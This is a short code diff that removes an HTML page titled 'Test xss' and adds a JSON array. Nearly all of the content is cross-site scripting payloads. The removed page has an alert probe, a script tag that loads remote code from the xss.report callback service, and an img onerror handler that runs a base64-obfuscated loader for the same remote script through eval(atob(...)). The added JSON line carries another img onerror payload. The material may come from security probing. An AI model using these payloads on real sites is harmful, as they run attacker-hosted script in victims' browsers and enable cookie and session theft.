@@ -1,15 +1,1 @@
-<!DOCTYPE HTML>
-<html>
-<head>
-<title>Test xss</title>
-</head>
-
-
-<body>
-  <script>alert(document.domain);</script>
-  <script src=//xss.report/s/maldevoresearch></script>
-<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL21hbGRldm9yZXNlYXJjaCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
-</body>
-
-</html>
-
+["Ford","<img src=maldevo onerror=confirm(111)>"]
